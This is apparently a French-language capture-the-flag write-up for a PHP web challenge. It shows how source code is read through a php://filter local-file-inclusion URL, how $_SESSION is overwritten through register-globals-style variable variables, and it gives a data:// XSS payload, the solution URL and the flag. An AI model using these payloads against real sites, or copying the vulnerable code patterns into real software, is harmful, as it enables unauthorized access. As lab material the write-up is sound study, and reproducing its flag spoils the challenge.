## LFI : ajax.php?load=php://filter/convert.base64-encode/resource=admin
```php
ajax
<?php

if (isset($_GET['load']) && !empty($_GET['load'])) {
	if (is_string($_GET['load']))
		echo file_get_contents($_GET['load'].'.php');
}


?>

view-source:web6.ese.crashlab.org/ajax.php?load=functions
<?php
function get_flag() {
	$pdo = new PDO('sqlite:'.dirname(__FILE__).'/db.sqlite');
	$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
	$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$q = $pdo->query("SELECT flag FROM flag");
	$d = $q->fetch();
	return $d['flag'];
}
web6.ese.crashlab.org/db.sqlite~  Nope
web6.ese.crashlab.org/db.sqlite Nope
?>
```

http://web6.ese.crashlab.org/ajax.php?load=php://filter/convert.base64-encode/resource=admin
view-source:web6.ese.crashlab.org/ajax.php?load=admin
```php
<?php

require 'functions.php';
//admin page

if (isset($_SESSION['auth']) && $_SESSION['auth'] == "true") {
	echo get_flag();
}
else if (isset($_POST['password']) && sha1($_POST['password']) == "cdbd845f59a4350228398a5d47689e2077bb14f2") {
	$_SESSION['auth'] = 'true';
	header('Location: admin.php');
}
else {
	echo "<form action='' method='POST'>";
	echo "Password <input type='password' name='password' ><br>";
	echo "<input type='submit' value='Login !'>";
	echo "</form>";
}

?>

```


## Register Global
view-source:web6.ese.crashlab.org/ajax.php?load=common
?
```php
<?php
require 'common.php';
?>

<!DOCTYPE html>
<html lang="en">

<head>

<?php
foreach ($_GET as $key => $value) {
	$$key = $value;
}

# Pas d'include car file_exist !!!!!
if (isset($lang) && !empty($lang)) {
	if (file_exists("lang/$lang.php"))
		include "lang/$lang.php";
	else
		include "lang/en.php";
} else {
	include "lang/en.php";
}

?>
```

```
web6.ese.crashlab.org/common.php?_SESSION['auth']='true'
web6.ese.crashlab.org/common.php?_SESSION['auth']='true'
?_SESSION['auth']='true'
trouver comment set ?_SESSION['auth']='true' avec le register
?_SESSION=%27true%27
?_SESSION[%27auth%27]=true
web6.ese.crashlab.org/admin.php?_SESSION=%27auth%27:%27true%27
web6.ese.crashlab.org/admin.php?_SESSION.'auth'=true
web6.ese.crashlab.org/admin.php?_SESSION->'auth'=true
web6.ese.crashlab.org/admin.php?_SESSION.0=true
http://127.0.0.1/?_SESSION=true Warning: Illegal string offset 'auth' in /var/www/html/index.php on line 22
http://127.0.0.1/?_SESSION.auth=true
http://127.0.0.1/?_SESSION->auth=true
127.0.0.1/?_SESSION%3D%3Eauth=true
127.0.0.1/?_SESSION=>auth=true
web6.ese.crashlab.org/admin.php?_SESSION%5Bauth%5D=true -> array(1) { ["auth"]=> string(4) "true" }
				echo $_SESSION['auth'];

Bon payload:
?_SESSION%5Bauth%5D=true
et
echo "true"==true;   => 1
```

```
http://web6.ese.crashlab.org/common.php?lang=../admin&_SESSION%5Bauth%5D=true
ese{facile_Ou_Pas?}
```








## Methodologie Write up:
REGARDER le code source pour trouver les fichiers AJAX intéressants
LFI pour avoir le code source : ajax.php?load=php://filter/convert.base64-encode/resource=admin , common, index, etc   
REGISTER GLOBAL pour définir les variables lang et SESSION   :  lang=../admin&_SESSION%5Bauth%5D=true
LFI pour inclure la page et que la variable session soit injectée dans admin.php
REGISTER GLOBAL pour être connecté avec la session car echo "true"==true;   => 1 dans PHP, et [] encodé
Flag : ese{facile_Ou_Pas?}



### Fun
```
v1 Fun :p EDIT: Fixed
-------------------
http://web6.ese.crashlab.org/ajax.php?load=data://text/plain,,%3Chtml%3E%3Csvg%20onload=alert%28String.fromCharCode%2887,104,121,32,117,32,100,111,32,100,105,115,32,33,32,71,105,109,109,101,32,100,97,32,102,108,97,103%29%29%3E%3C!--
```
